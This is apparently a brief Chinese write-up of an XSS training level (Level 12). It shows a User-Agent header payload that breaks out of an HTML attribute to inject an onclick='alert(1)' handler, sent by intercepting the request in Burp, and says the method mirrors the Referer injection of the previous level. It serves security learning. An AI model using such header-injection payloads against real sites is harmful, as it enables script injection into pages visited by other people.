# Level 12 — User-Agent 头注入

## 发现过程

同 Level 11 套路，看源码 `t_ua` 参数对应 `$_SERVER['HTTP_USER_AGENT']`。

## Payload

Burp 截请求，改 User-Agent：

```
User-Agent: " onclick="alert(1)" type="text"
```
![](99_Attachments/图片/level12/file-20260622195620414.png)

![](99_Attachments/图片/level12/file-20260622195627261.png)
## 要点

和 Level 11 完全一样，只是 Header 换了一个。Referer → User-Agent，其他照旧。
